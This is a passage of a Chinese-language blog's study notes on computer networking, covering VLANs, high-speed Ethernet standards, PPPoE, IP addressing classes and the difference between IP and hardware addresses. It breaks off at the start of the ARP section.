alt="image-20210413174643551"></p><table><thead><tr><th>MAC  地址</th><th>VLAN</th></tr></thead><tbody><tr><td>00-15-F5-CC-C8-14</td><td>10</td></tr><tr><td>C0-AB-D5-00-18-F4</td><td>10</td></tr><tr><td>C0-C5-18-DE-BC-E6</td><td>30</td></tr></tbody></table><h4 id="基于协议类型的方法"><a href="#基于协议类型的方法" class="headerlink" title="基于协议类型的方法"></a>基于协议类型的方法</h4><p>根据<strong>以太网帧的第三个字段“类型”字段</strong>确定该类型的协议属于哪一个虚拟局域网。<br>属于在第二层划分虚拟局域网的方法。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413175313847.png" alt="image-20210413175313847"></p><table><thead><tr><th>“类型”</th><th>VLAN</th></tr></thead><tbody><tr><td>IP</td><td>10</td></tr><tr><td>IPX</td><td>30</td></tr><tr><td>……</td><td>…</td></tr></tbody></table><h4 id="基于IP子网地址的方法"><a href="#基于IP子网地址的方法" class="headerlink" title="基于IP子网地址的方法"></a>基于IP子网地址的方法</h4><p>根据<strong>以太网帧的第三个字段“类型”字段</strong>和<strong>IP分组首部中的源 IP 地址字段</strong>确定该 IP 分组属于哪一个虚拟局域网。<br>属于在第三层（网络层）划分虚拟局域网的方法。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413175434466.png" alt="image-20210413175434466"></p><table><thead><tr><th>IP  子网</th><th>VLAN</th></tr></thead><tbody><tr><td>192.168.1.0/24</td><td>10</td></tr><tr><td>192.168.2.0/24</td><td>30</td></tr><tr><td>……</td><td>…</td></tr></tbody></table><h4 id="基于高层应用或服务的方法"><a href="#基于高层应用或服务的方法" class="headerlink" title="基于高层应用或服务的方法"></a>基于高层应用或服务的方法</h4><p>根据高层应用或服务、或者它们的组合划分虚拟局域网。<br>更加灵活，但更加复杂。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413175556212.png" alt="image-20210413175556212"></p><table><thead><tr><th>应用</th><th>VLAN</th></tr></thead><tbody><tr><td>FTP</td><td>10</td></tr><tr><td>TELNET</td><td>30</td></tr><tr><td>……</td><td>…</td></tr></tbody></table><h3 id="虚拟局域网使用的以太网帧格式"><a href="#虚拟局域网使用的以太网帧格式" class="headerlink" title="虚拟局域网使用的以太网帧格式"></a>虚拟局域网使用的以太网帧格式</h3><p>IEEE 批准了 802.3ac 标准，该标准定义了以太网的帧格式的扩展，以支持虚拟局域网。</p><p>虚拟局域网协议允许在以太网的帧格式中插入一个4字节的标识符，称为 VLAN 标记 (tag)，用来指明该帧属于哪一个虚拟局域网。插入VLAN标记得出的帧称为 802.1Q 帧或带标记的以太网帧。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413175642834.png" alt="image-20210413175642834"></p><p>传送过程图示</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413175721413.png" alt="image-20210413175721413"></p><h1 id="高速以太网"><a href="#高速以太网" class="headerlink" title="高速以太网"></a>高速以太网</h1><h2 id="100BASE-T-以太网"><a href="#100BASE-T-以太网" class="headerlink" title="100BASE-T 以太网"></a>100BASE-T 以太网</h2><p><strong>速率达到或超过 100 Mbit/s 的以太网称为高速以太网。</strong></p><p>100BASE-T 在双绞线上传送 100 Mbit/s 基带信号的星形拓扑以太网，仍使用 IEEE 802.3 的 CSMA/CD 协议。100BASE-T 以太网又称为快速以太网 (Fast Ethernet)。1995 年IEEE已把 100BASE-T 的快速以太网定为正式标准，其代号为 IEEE 802.3u。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>可在全双工方式下工作而无冲突发生。<strong>在全双工方式下工作时，不使用 CSMA/CD 协议</strong>。</li><li><strong>MAC 帧格式仍然是 802.3 标准规定的。</strong></li><li><strong>保持最短帧长不变，但将一个网段的最大电缆长度减小到 100 米。</strong></li><li>帧间时间间隔从原来的 9.6μs 改为现在的 0.96μs 。 </li></ul><h3 id="100-Mbit-s-以太网的三种不同的物理层标准"><a href="#100-Mbit-s-以太网的三种不同的物理层标准" class="headerlink" title="100 Mbit/s 以太网的三种不同的物理层标准"></a>100 Mbit/s 以太网的三种不同的物理层标准</h3><ul><li>100BASE-TX<ol><li>使用 2 对 UTP 5 类线 或 屏蔽双绞线 STP。</li><li>网段最大程度：100 米。</li></ol></li><li>100BASE-T4<ol><li>使用 4 对 UTP 3 类线 或 5 类线。 </li><li>网段最大程度：100 米。</li></ol></li><li>100BASE-FX <ol><li>使用 2 对光纤。 </li><li>网段最大程度：2000 米。</li></ol></li></ul><h2 id="吉比特以太网"><a href="#吉比特以太网" class="headerlink" title="吉比特以太网"></a>吉比特以太网</h2><p>允许在 1 Gbit/s 下以全双工和半双工两种方式工作。使用 IEEE 802.3 协议规定的帧格式。<strong>在半双工方式下使用 CSMA/CD 协议，全双工方式不使用 CSMA/CD 协议。</strong>与 10BASE-T 和 100BASE-T 技术向后兼容。</p><blockquote><p>吉比特以太网可用作现有网络的主干网，也可在高带宽（高速率）的应用场合中。</p></blockquote><p><strong>使用两种成熟的技术：</strong>一种来自现有的以太网，另一种则是美国国家标准协会 ANSI 制定的光纤通道 FC  (Fiber Channel)。</p><table><thead><tr><th>名称</th><th>媒体</th><th>网段最大长度</th><th>特点</th></tr></thead><tbody><tr><td>1000BASE-SX</td><td>光缆</td><td>550  m</td><td>多模光纤（50 和 62.5  mm）</td></tr><tr><td>1000BASE-LX</td><td>光缆</td><td>5000  m</td><td>单模光纤（10 mm）多模光纤（50 和 62.5  mm）</td></tr><tr><td>1000BASE-CX</td><td>铜缆</td><td>25  m</td><td>使用 2  对屏蔽双绞线电缆  STP</td></tr><tr><td>1000BASE-T</td><td>铜缆</td><td>100  m</td><td>使用 4  对  UTP 5 类线</td></tr></tbody></table><h3 id="半双工方式工作的吉比特以太网"><a href="#半双工方式工作的吉比特以太网" class="headerlink" title="半双工方式工作的吉比特以太网"></a>半双工方式工作的吉比特以太网</h3><p>吉比特以太网工作在半双工方式时，就必须进行碰撞检测。为保持 64 字节最小帧长度，以及 100 米的网段的最大长度，吉比特以太网增加了两个功能：</p><ol><li><strong>载波延伸 (carrier extension)</strong></li><li><strong>分组突发 (packet bursting)</strong></li></ol><h3 id="载波延伸"><a href="#载波延伸" class="headerlink" title="载波延伸"></a>载波延伸</h3><p>使最短帧长仍为 64 字节（这样可以保持兼容性），<strong>同时将争用时间增大为 512 字节</strong>。</p><p>凡发送的 MAC 帧长不足 512 字节时，就用一些特殊字符填充在帧的后面，使MAC 帧的发送长度增大到 512 字节。接收端在收到以太网的 MAC 帧后，要将所填充的特殊字符删除后才向高层交付。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413195200135.png" alt="image-20210413195200135"></p><h3 id="分组突发"><a href="#分组突发" class="headerlink" title="分组突发"></a>分组突发</h3><p>当很多短帧要发送时，第一个短帧要采用载波延伸方法进行填充，随后的一些短帧则可一个接一个地发送，只需留有必要的帧间最小间隔即可。这样就形成可一串分组的突发，直到达到 1500 字节或稍多一些为止。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210413195224917.png" alt="image-20210413195224917"></p><h3 id="全双工方式工作的吉比特以太网"><a href="#全双工方式工作的吉比特以太网" class="headerlink" title="全双工方式工作的吉比特以太网"></a>全双工方式工作的吉比特以太网</h3><p>当吉比特以太网工作在全双工方式时（即通信双方可同时进行发送和接收数据），<strong>不使用载波延伸和分组突发。</strong></p><h2 id="10-吉比特以太网-10GE-和更快的以太网"><a href="#10-吉比特以太网-10GE-和更快的以太网" class="headerlink" title="10 吉比特以太网 (10GE) 和更快的以太网"></a>10 吉比特以太网 (10GE) 和更快的以太网</h2><p>10 吉比特以太网（10GE）并非把吉比特以太网的速率简单地提高到 10 倍，其主要特点有：</p><ol><li>与 10 Mbit/s、100 Mbit/s 和 1 Gbit/s 以太网的帧格式完全相同。</li><li>保留了 802.3 标准规定的以太网最小和最大帧长，便于升级。<br>不再使用铜线而只使用光纤作为传输媒体。</li><li><strong>只工作在全双工方式，因此没有争用问题，也不使用 CSMA/CD 协议。</strong> </li></ol><p><strong>10GE 的物理层标准</strong></p><table><thead><tr><th align="center">名称</th><th align="center">媒体</th><th align="center">网段最大长度</th><th align="center">特点</th></tr></thead><tbody><tr><td align="center">10GBASE-SR</td><td align="center">光缆</td><td align="center">300  m</td><td align="center">多模光纤（0.85 mm）</td></tr><tr><td align="center">10GBASE-LR</td><td align="center">光缆</td><td align="center">10  km</td><td align="center">单模光纤（1.3 mm）</td></tr><tr><td align="center">10GBASE-ER</td><td align="center">光缆</td><td align="center">40  km</td><td align="center">单模光纤（1.5 mm）</td></tr><tr><td align="center">10GBASE-CX4</td><td align="center">铜缆</td><td align="center">15  m</td><td align="center">使用 4  对双芯同轴电缆  (twinax)</td></tr><tr><td align="center">10GBASE-T</td><td align="center">铜缆</td><td align="center">100  m</td><td align="center">使用 4  对  6A 类 UTP  双绞线</td></tr></tbody></table><h2 id="端到端的以太网传输"><a href="#端到端的以太网传输" class="headerlink" title="端到端的以太网传输"></a>端到端的以太网传输</h2><p>以太网的工作范围已经从局域网（校园网、企业网）扩大到城域网和广域网，从而实现了<strong>端到端的以太网传输</strong>。</p><p>这种工作方式的好处有： </p><ol><li>技术成熟；</li><li>互操作性很好；</li><li>在广域网中使用以太网时价格便宜；</li><li>采用统一的以太网帧格式，简化了操作和管理。 </li></ol><h2 id="使用以太网进行宽带接入"><a href="#使用以太网进行宽带接入" class="headerlink" title="使用以太网进行宽带接入"></a>使用以太网进行宽带接入</h2><p>IEEE 在 2001 年初成立了 802.3 EFM 工作组，专门研究高速以太网的宽带接入技术问题。</p><p>以太网宽带接入具有以下<strong>特点</strong>：</p><ol><li>可以提供<strong>双向</strong>的宽带通信。</li><li>可以根据用户对带宽的需求灵活地进行带宽升级。</li><li>可以实现端到端的以太网传输，中间<strong>不需要再进行帧格式的转换</strong>。这就提高了数据的传输效率且降低了传输的成本。</li><li><strong>但是不支持用户身份鉴别</strong>。</li></ol><h2 id="PPPoE"><a href="#PPPoE" class="headerlink" title="PPPoE"></a>PPPoE</h2><blockquote><p><strong>PPPoE (PPP over Ethernet)</strong> 的意思是<strong>“在以太网上运行 PPP</strong>”，它把 PPP 协议与以太网协议结合起来 —— 将 PPP 帧再封装到以太网中来传输。</p></blockquote><p>现在的光纤宽带接入 FTTx 都要使用 PPPoE 的方式进行接入。在 PPPoE 弹出的窗口中键入在网络运营商购买的用户名和密码，就可以进行宽带上网了。</p><p>利用 ADSL 进行宽带上网时，从用户个人电脑到家中的 ADSL 调制解调器之间，也是使用 RJ-45 和 5 类线（即以太网使用的网线）进行连接的，并且也是使用 PPPoE 弹出的窗口进行拨号连接的。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-网络层</title>
      <link href="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
      <url>/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<blockquote><p>注：内容根据《计算机网络第七版》以及相关PPT整理制作，图片主要源于{电子工程出版社}，部分图片源于学校老师上课所画的图以及自己制作的思维导图</p></blockquote><h1 id="网络层提供何种服务"><a href="#网络层提供何种服务" class="headerlink" title="网络层提供何种服务"></a>网络层提供何种服务</h1><p>首先，从以下问题进入网络层的学习（书里就是这样）</p><p>在计算机网络领域，网络层应该向运输层提供怎样的服务<strong>（“面向连接”还是“无连接”</strong>）曾引起了长期的争论。<br>争论焦点的实质就是：在计算机通信中，<strong>可靠交付</strong>应当由谁来负责？是<strong>网络</strong>还是<strong>端系统</strong>？ </p><h2 id="让网络负责可靠交付"><a href="#让网络负责可靠交付" class="headerlink" title="让网络负责可靠交付"></a>让网络负责可靠交付</h2><p>这种观点认为，应借助于电信网的成功经验，让网络负责可靠交付，计算机网络应模仿电信网络，使用<strong>面向连接</strong>的通信方式。通信之前先建立<strong>虚电路 (Virtual Circuit)</strong>，以保证双方通信所需的一切网络资源。 如果再使用<strong>可靠传输</strong>的网络协议，就可使所发送的分组<strong>无差错按序</strong>到达终点，不丢失、不重复。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415181401821.png" alt="H1 发送给 H2 的所有分组都沿着同一条虚电路传送"></p><p>H1 发送给 H2 的所有分组都沿着同一条虚电路传送</p><p>虚电路表示这只是一条<strong>逻辑上的连接</strong>，分组都沿着这条逻辑连接按照<strong>存储转发方式</strong>传送，而并不是真正建立了一条物理连接。<strong>请注意，电路交换的电话通信是先建立了一条真正的连接。</strong>因此分组交换的虚连接和电路交换的连接只是类似，但并不完全一样。 </p><blockquote><p>这样的情况已经遇到很多次了且很重要，在上一章数据链路层也讲了这种逻辑链接，为了屏蔽掉复杂的数据传递过程，我们会频繁的使用逻辑连接这一方法来帮助我们理解对等层之间的通信问题，放心，在接下来的运输层（TCP、UDP）和应用层（HTTP）也同样会使用该方法</p></blockquote><h2 id="网络提供数据报服务"><a href="#网络提供数据报服务" class="headerlink" title="网络提供数据报服务"></a>网络提供数据报服务</h2><p>互联网的先驱者提出了一种崭新的网络设计思路。网络层向上只提供简单灵活的、<strong>无连接的、尽最大努力交付的数据报服务</strong>。</p><p>网络在发送分组时不需要先建立连接。每一个分组（即 IP 数据报）独立发送，<strong>与其前后的分组无关</strong>（不进行编号）。</p><p>网络层<strong>不提供服务质量的承诺</strong>。即所传送的分组可能出错、丢失、重复和失序（不按序到达终点），当然也不保证分组传送的时限。 </p><p>由于传输网络<strong>不提供端到端的可靠传输服务</strong>，这就使网络中的路由器可以做得比较简单，而且价格低廉（与电信网的交换机相比较）。如果主机（即端系统）中的进程之间的通信需要是可靠的，那么就由网络的主机中的<strong>运输层负责可靠交付</strong>（包括差错处理、流量控制等） 。</p><p>采用这种设计思路的好处是：<strong>网络的造价大大降低，运行方式灵活</strong>，能够适应多种应用。</p><p>这也证明了互连网能够发展到今日的规模，缘于当初采用这种设计思路的正确性。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415182142417.png" alt="image-20210415182142417"></p><p>最后的答案就是<strong>端系统负责可靠交付</strong>啦，然后网络负责提供<strong>无连接的、尽最大努力交付的数据报服务</strong></p><p>丢出一张表对比下虚电路服务和数据报服务</p><table><thead><tr><th align="left">对比的方面</th><th align="left">虚电路服务</th><th align="left">数据报服务</th></tr></thead><tbody><tr><td align="left">思路</td><td align="left">可靠通信应当由网络来保证</td><td align="left">可靠通信应当由用户主机来保证</td></tr><tr><td align="left">连接的建立</td><td align="left">必须有</td><td align="left">不需要</td></tr><tr><td align="left">终点地址</td><td align="left">仅在连接建立阶段使用，每个分组使用短的虚电路号</td><td align="left">每个分组都有终点的完整地址</td></tr><tr><td align="left">分组的转发</td><td align="left">属于同一条虚电路的分组均按照同一路由进行转发</td><td align="left">每个分组独立选择路由进行转发</td></tr><tr><td align="left">当结点出故障时</td><td align="left">所有通过出故障的结点的虚电路均不能工作</td><td align="left">出故障的结点可能会丢失分组，一些路由可能会发生变化</td></tr><tr><td align="left">分组的顺序</td><td align="left">总是按发送顺序到达终点</td><td align="left">到达终点时不一定按发送顺序</td></tr><tr><td align="left">端到端的差错处理和流量控制</td><td align="left">可以由网络负责，也可以由用户主机负责</td><td align="left">由用户主机负责</td></tr></tbody></table><h1 id="网际协议-IP"><a href="#网际协议-IP" class="headerlink" title="网际协议 IP"></a>网际协议 IP</h1><p>网际协议 IP 是 TCP/IP 体系中两个最主要的协议之一。</p><p>与 IP 协议配套使用的还有三个协议：</p><ol><li><strong>地址解析协议 ARP (Address Resolution Protocol)</strong></li><li><strong>网际控制报文协议 ICMP (Internet Control Message Protocol)</strong></li><li><strong>网际组管理协议 IGMP (Internet Group Management Protocol)</strong></li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415183411541.png" alt="image-20210415183411541"></p><h2 id="虚拟互连网络"><a href="#虚拟互连网络" class="headerlink" title="虚拟互连网络"></a>虚拟互连网络</h2><p>将网络互连并能够互相通信，会遇到许多问题需要解决，如：</p><ol><li>不同的寻址方案</li><li>不同的最大分组长度</li><li>不同的网络接入机制</li><li>不同的超时控制</li><li>不同的差错恢复方法</li><li>不同的状态报告方法</li><li>不同的路由选择技术</li><li>不同的用户接入控制</li><li>不同的服务（面向连接服务和无连接服务）</li><li>不同的管理与控制方式等</li></ol><p>妈耶这也太多了，所以这一章的内容是最多的，同时理论上也是五层协议里面最复杂最重要的一章，也会包含了一些计算题</p><p>将网络互相连接起来要使用一些中间设备。 中间设备又称为<strong>中间系统或中继 (relay)系统</strong>。有以下五种不同的中间设备：</p><ol><li>物理层中继系统：<strong>转发器 (repeater)</strong>。</li><li>数据链路层中继系统：<strong>网桥</strong> 或 <strong>桥接器 (bridge)</strong>。</li><li>网络层中继系统：<strong>路由器 (router)</strong>。</li><li>网桥和路由器的混合物：<strong>桥路器 (brouter)</strong>。</li><li>网络层以上的中继系统：<strong>网关 (gateway)</strong>。 </li></ol><p>当中继系统是转发器或网桥时，一般并不称之为网络互连，因为这仅仅是把一个网络扩大了，而这仍然是一个网络。（回想下数据链路层的集线器以及交换机的工作） 网关由于比较复杂，目前使用得较少。<br><strong>网络互连都是指用路由器进行网络互连和路由选择。</strong>由于历史的原因，许多有关 TCP/IP 的文献将网络层使用的路由器称为网关。   </p><h3 id="虚拟互连网络的意义"><a href="#虚拟互连网络的意义" class="headerlink" title="虚拟互连网络的意义"></a>虚拟互连网络的意义</h3><p><strong>所谓虚拟互连网络也就是逻辑互连网络</strong>，它的意思就是互连起来的各种物理网络的异构性本来是客观存在的，但是我们利用 IP 协议就可以使这些性能各异的网络从用户看起来好像是一个统一的网络。使用 IP 协议的虚拟互连网络可简称为 IP 网。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415192112095.png" alt="image-20210415192112095"></p><p><strong>使用虚拟互连网络的好处是</strong>：当互联网上的主机进行通信时，就好像在一个网络上通信一样，而看不见互连的各具体的网络异构细节。如果在这种覆盖全球的 IP 网的上层使用 <strong>TCP 协议</strong>（运输层），那么就是现在的互联网 (Internet)。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415192705638.png" alt="image-20210415192705638"></p><p>最后，从网络层去考虑问题（联想下数据链路层考虑问题的方法），那么 IP 数据报就可以想象是在网络层中传送。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415194411960.png" alt="image-20210415194411960"></p><h2 id="分类的-IP-地址"><a href="#分类的-IP-地址" class="headerlink" title="分类的 IP 地址"></a>分类的 IP 地址</h2><h3 id="IP-地址及其表示方法"><a href="#IP-地址及其表示方法" class="headerlink" title="IP 地址及其表示方法"></a>IP 地址及其表示方法</h3><p>我们把整个互联网看成为一个单一的、抽象的网络。IP 地址就是给每个连接在互联网上的主机（或路由器）分配一个在全世界范围是<strong>唯一的 32 位的标识符</strong>。</p><p>IP 地址现在由互联网名字和数字分配机构ICANN (Internet Corporation for Assigned Names and Numbers)进行分配。 </p><p><strong>IP 地址的编址方法</strong></p><p><strong>分类的 IP 地址。</strong>这是最<strong>基本的编址方法</strong>，在1981年就通过了相应的标准协议。</p><p><strong><a href="#划分子网和构造超网">子网的划分</a>。</strong>这是对最基本的编址方法的改进，其标准[RFC 950]在1985年通过。</p><p><strong><a href="#划分子网和构造超网">构成超网</a>。</strong>这是比较新的<strong>无分类编址方法</strong>。1993年提出后很快就得到推广应用。</p><p>先来讲讲第一个IP地址的分类，后面两个会在第三节提到</p><p>将IP地址划分为若干个固定类。</p><p>每一类地址都由两个固定长度的字段组成，其中一个字段是<strong>网络号 net-id</strong>，它标志主机（或路由器）所连接到的网络，而另一个字段则是<strong>主机号 host-id</strong>，它标志该主机（或路由器）。</p><p>主机号在它前面的网络号所指明的网络范围内必须是唯一的。<br>由此可见，<strong>一个 IP 地址在整个互联网范围内是唯一的</strong>。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415195656915.png" alt="image-20210415195656915"></p><p>也可以这样（::=  代表“定义为”)</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415195727663.png" alt="image-20210415195727663"></p><p>一开始，网络被分为五类地址，后来因为<strong>无分类IP地址</strong>的广泛使用，这种区分变成了历史</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415195926200.png" alt="image-20210415195926200"></p><h4 id="点分十进制记法"><a href="#点分十进制记法" class="headerlink" title="点分十进制记法"></a>点分十进制记法</h4><p>机器中存放的 IP 地址是 32 位二进制代码，长这样，好记不，不好记</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415200148882.png" alt="image-20210415200148882"></p><p>所以，聪明的人们就想到了点分十进制法来方便我们记住ip地址</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415200242102.png" alt="image-20210415200242102"></p><p>下面是一堆点分十进制的具体例子</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415200310917.png" alt="image-20210415200310917"></p><h3 id="常用的三种类别的-IP-地址"><a href="#常用的三种类别的-IP-地址" class="headerlink" title="常用的三种类别的 IP 地址"></a>常用的三种类别的 IP 地址</h3><table><thead><tr><th align="left">网络  类别</th><th align="left">最大可指派的网络数</th><th>第一个可指派的网络号</th><th>最后一个可指派的网络号</th><th align="left">每个网络中最大主机数</th></tr></thead><tbody><tr><td align="left">A</td><td align="left">126 (27  – 2)</td><td>1</td><td>126</td><td align="left">16777214</td></tr><tr><td align="left">B</td><td align="left">16383 (214  – 1)</td><td>128.1</td><td>191.255</td><td align="left">65534</td></tr><tr><td align="left">C</td><td align="left">2097151 (221 – 1)</td><td>192.0.1</td><td>223.255.255</td><td align="left">254</td></tr></tbody></table><p>一些一般情况下不使用的特殊IP地址</p><table><thead><tr><th>网络号</th><th>主机号</th><th>源地址使用</th><th>目的地址使用</th><th>代表的意思</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>可以</td><td>不可</td><td>在本网络上的本主机（见 6.6  节 DHCP  协议）</td></tr><tr><td>0</td><td>host-id</td><td>可以</td><td>不可</td><td>在本网络上的某台主机 host-id</td></tr><tr><td>全 1</td><td>全 1</td><td>不可</td><td>可以</td><td>只在本网络上进行广播（各路由器均不转发）</td></tr><tr><td>net-id</td><td>全 1</td><td>不可</td><td>可以</td><td>对 net-id  上的所有主机进行广播</td></tr><tr><td>127</td><td>非全 0 或全 1 的任何数</td><td>可以</td><td>可以</td><td>用于本地软件环回测试</td></tr></tbody></table><p>注意：A类地址→127.0.0.1一般作为本主机进程之间的通信所用</p><h3 id="IP-地址的一些重要特点"><a href="#IP-地址的一些重要特点" class="headerlink" title="IP 地址的一些重要特点"></a>IP 地址的一些重要特点</h3><p>(1) <strong>IP 地址是一种分等级的地址结构</strong>。分两个等级的好处是：</p><ol><li>第一，IP 地址管理机构在分配 IP 地址时只分配网络号，而剩下的主机号则由得到该网络号的单位自行分配。这样就方便了 IP 地址的管理。</li><li>第二，路由器<strong>仅根据目的主机所连接的网络号来转发分组</strong>（而不考虑目的主机号），这样就可以使路由表中的项目数大幅度减少，从而减小了路由表所占的存储空间。 </li></ol><p>(2) 实际上 IP 地址是标志一个主机（或路由器）和一条链路的接口。</p><ul><li>当一个主机同时连接到两个网络上时，该主机就必须同时具有两个相应的 IP 地址，其网络号 net-id 必须是不同的。这种主机称为<strong>多归属主机 (multihomed host)</strong>。</li><li>由于一个路由器至少应当连接到两个网络（这样它才能将 IP 数据报从一个网络转发到另一个网络），因此<strong>一个路由器至少应当有两个不同的 IP 地址</strong>。 </li></ul><p>(3) <strong>用转发器或网桥连接起来的若干个局域网仍为一个网络，因此这些局域网都具有同样的网络号 net-id</strong>。</p><p>(4) 所有分配到网络号 net-id 的网络，无论是范围很小的局域网，还是可能覆盖很大地理范围的广域网，都是<strong>平等的</strong>。</p><p>通过下面的图加深对以上特点的理解</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415201912374.png" alt="image-20210415201912374"></p><p>在同一个局域网上的主机或路由器的IP 地址中的网络号必须是一样的。图中的网络号就是 IP 地址中的 net-id。（各个粉色区域即各自的局域网）</p><p>路由器总是具有两个或两个以上的IP地址。路由器的每一个接口都有一个不同网络号的IP地址。（R1、R2、R3）</p><p>两个路由器直接相连的接口处，可指明也可不指明IP地址。如指明IP地址，则这一段连线就构成了一种只包含一段线路的特殊“网络” 。现在常不指明IP地址。（中间粉紫色的N1、N2、N3）</p><h2 id="IP-地址与硬件地址"><a href="#IP-地址与硬件地址" class="headerlink" title="IP 地址与硬件地址"></a>IP 地址与硬件地址</h2><p>IP 地址与硬件地址是不同的地址。从层次的角度看，<strong>硬件地址（或物理地址）是数据链路层和物理层使用的地址。IP 地址是网络层和以上各层使用的地址，是一种逻辑地址</strong>（称 IP 地址是逻辑地址是因为 IP 地址是用软件实现的）。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415202457509.png" alt="image-20210415202457509"></p><p>IP 地址放在 IP 数据报的首部，而硬件地址则放在 MAC 帧的首部。</p><p>我们先来看看在网络层上看，数据的具体流动方式</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415202558809.png" alt="image-20210415202558809"></p><p>再来看看在实际的协议栈上，数据的流动</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415202646057.png" alt="image-20210415202646057"></p><p>从虚拟的 IP 层上看 IP 数据报的流动（和上面的网络层的图性质类似，只不过简化了点）</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415202714172.png" alt="image-20210415202714172"></p><p>而从链路上看呢，在具体的物理网络的链路层，只能看见 MAC 帧而看不见 IP 数据报 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415202851371.png" alt="image-20210415202851371"></p><p>现在回头再来看看IP协议层的数据流动，图中的  IP1 → IP2  表示从源地址 IP1 到目的地址 IP2 。两个路由器的 IP 地址并不出现在 IP 数据报的首部中。 路由器只根据目的站的 IP 地址的网络号进行路由选择。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415202714172.png" alt="image-20210415202714172"></p><p>IP 层抽象的互联网屏蔽了下层很复杂的细节。在抽象的网络层上讨论问题，就能够使用统一的、抽象的 IP 地址研究主机和主机或主机和路由器之间的通信 。（会不会又啰嗦了）</p><p>主机 H1 与 H2 通信中使用的IP地址与硬件地址举例(根据上图理解)</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415203207464.png" alt="image-20210415203207464"></p><h2 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a><strong>地址解析协议 ARP</strong></h2><p>通过上面的了解，我们知道了硬件地址和IP地址的区别，现在就来考虑在实际协议栈中硬件地址和IP地址是如何进行转换的</p><blockquote><p>通信时使用了两个地址：</p><ol><li>IP 地址（网络层地址）</li><li>MAC 地址（数据链路层地址）</li></ol></blockquote><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415203642454.png" alt="image-20210415203642454"></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>地址解析协议 ARP 就是用来通过IP地址来查找对应的硬件地址</p><blockquote><p>ARP 作用：<br>从网络层使用的 IP 地址，解析出在数据链路层使用的硬件地址。</p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415203805823.png" alt="image-20210415203805823"></p><p>通过前面我们也知道，不管网络层使用的是什么协议，在实际网络的链路上传送数据帧时，最终还是必须使用硬件地址。 </p><p>每一个主机都设有一个 ARP 高速缓存 (ARP cache)，里面有所在的局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415203906033.png" alt="image-20210415203906033"></p><p>注：TTL (Time To Live)：地址映射有效时间 </p><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>当主机 A 欲向本局域网上的某个主机 